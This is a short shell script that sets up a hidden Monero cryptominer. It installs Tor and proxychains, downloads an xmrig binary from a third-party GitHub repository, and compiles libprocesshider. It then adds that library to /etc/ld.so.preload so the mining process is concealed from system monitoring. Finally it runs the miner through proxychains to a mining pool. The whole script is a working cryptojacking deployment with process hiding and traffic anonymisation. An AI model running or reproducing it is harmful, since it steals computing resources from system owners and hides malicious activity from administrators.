#!/bin/sh

apt update
apt -y install binutils cmake build-essential unzip net-tools curl tor proxychains
service tor start

sed -i -e 's/#dynamic_chain/dynamic_chain/g;s/strict_chain/#strict_chain/g;s/socks4/socks5/g' /etc/proxychains.conf

wget https://raw.githubusercontent.com/hondacars/xxx/main/xmrig
chmod +x xmrig

git clone https://github.com/gianlucaborello/libprocesshider.git
cd libprocesshider
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..

proxychains ./xmrig -o stratum+tcp://prohashing.com:3359 -u Prodent -p n=$(echo $(shuf -i 1-200 -n 1)-CS) -k --coin monero -a rx/0
